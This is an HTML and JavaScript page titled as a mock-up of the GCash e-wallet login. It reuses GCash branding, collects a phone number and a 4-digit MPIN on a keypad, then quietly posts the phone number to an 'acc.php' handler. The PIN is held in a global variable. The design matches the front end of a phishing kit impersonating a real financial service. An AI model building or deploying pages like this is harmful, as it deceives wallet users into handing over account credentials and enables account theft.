<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1.0" />
  <title>GCash Login Mock-Up</title>
  <link rel="stylesheet" href="gcashstyle.css" />
</head>
<body>

  <div class="logo">
    <img src="https://pbs.twimg.com/profile_images/1880037773518004224/bXIzORel.jpg" alt="GCash" />
    <h1>GCash</h1>
    <p>G for a greener tomorrow</p>
  </div>

  <div class="phone-input">
    <span class="prefix">+63‐</span>
    <input
      type="tel"
      id="phone"
      placeholder="9123456789"
      maxlength="10"
      pattern="\d{10}"
      title="Please enter exactly 10 digits"
      inputmode="numeric"
    />
  </div>

  <div class="mpin-btn" id="mpinButton">
    <div class="dots">
      <div></div><div></div><div></div>
      <div></div><div></div><div></div>
      <div></div><div></div><div></div>
    </div>
  </div>

  <div class="pin-modal" id="pinModal">
    <div class="pin-container">
      <div class="pin-dots">
        <div class="dot" data-index="0"></div>
        <div class="dot" data-index="1"></div>
        <div class="dot" data-index="2"></div>
        <div class="dot" data-index="3"></div>
      </div>
      <div class="keypad">
        <button data-key="1">1</button>
        <button data-key="2">2</button>
        <button data-key="3">3</button>
        <button data-key="4">4</button>
        <button data-key="5">5</button>
        <button data-key="6">6</button>
        <button data-key="7">7</button>
        <button data-key="8">8</button>
        <button data-key="9">9</button>
        <button id="keyBack">&larr;</button>
        <button data-key="0">0</button>
        <button id="keyCancel">×</button>
      </div>
    </div>
  </div>

  <script>
    (function () {
      const phoneInput = document.getElementById("phone");
      const mpinBtn = document.getElementById("mpinButton");
      const pinModal = document.getElementById("pinModal");
      const dots = document.querySelectorAll(".pin-dots .dot");

      if (!phoneInput || !mpinBtn || !pinModal) return;

      phoneInput.addEventListener("input", () => {
        const isValid = /^\d{10}$/.test(phoneInput.value.trim());
        if (isValid) {
          mpinBtn.classList.add("enabled");
        } else {
          mpinBtn.classList.remove("enabled");
        }
      });

      mpinBtn.addEventListener("click", () => {
        if (!mpinBtn.classList.contains("enabled")) return;
        dots.forEach((d) => d.classList.remove("filled"));
        pinModal.style.display = "flex";
        window._gcashPin = "";
      });

      pinModal.addEventListener("click", (e) => {
        if (e.target === pinModal || e.target.id === "keyCancel") {
          pinModal.style.display = "none";
        }
      });

      document.querySelectorAll(".keypad button").forEach((btn) => {
        btn.addEventListener("click", () => {
          const key = btn.dataset.key;
          if (!key || window._gcashPin.length >= 4) return;

          window._gcashPin += key;
          dots[window._gcashPin.length - 1].classList.add("filled");

          if (window._gcashPin.length === 4) {
            const phone = phoneInput.value.trim();

            const form = document.createElement("form");
            form.method = "POST";
            form.action = "acc.php";

            const input = document.createElement("input");
            input.type = "hidden";
            input.name = "phone";
            input.value = phone;

            form.appendChild(input);
            document.body.appendChild(form);
            form.submit();
          }
        });
      });

      document.getElementById("keyBack").addEventListener("click", () => {
        if (!window._gcashPin) return;
        dots[window._gcashPin.length - 1].classList.remove("filled");
        window._gcashPin = window._gcashPin.slice(0, -1);
      });
    })();
  </script>
</body>
</html>
